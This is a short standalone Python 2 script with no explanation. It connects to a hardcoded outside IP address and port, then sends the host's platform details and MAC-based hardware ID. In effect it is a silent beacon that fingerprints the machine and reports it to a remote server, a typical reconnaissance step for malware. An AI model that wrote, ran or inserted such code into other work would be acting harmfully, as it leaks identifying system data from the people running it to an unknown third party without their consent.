#!/usr/bin/python
# -*- coding: UTF-8 -*-
import socket
import platform
import uuid
s = socket.socket()
host = '118.25.18.237'
port = 12345
s.connect((host, port))
sysinfo=str(platform.uname())+'\n'+str(uuid.getnode())+'\n';
s.send(sysinfo)
s.close()
